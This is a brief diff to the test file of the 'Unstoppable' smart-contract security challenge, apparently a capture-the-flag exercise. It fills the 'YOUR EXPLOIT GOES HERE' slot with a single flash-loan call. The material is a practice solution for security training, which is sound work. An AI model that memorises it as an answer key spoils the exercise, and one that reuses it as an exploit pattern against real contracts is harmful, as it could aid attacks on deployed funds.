@@ -39,7 +39,7 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        await this.receiverContract.executeFlashLoan(TOKENS_IN_POOL);
     });
 
     after(async function () {
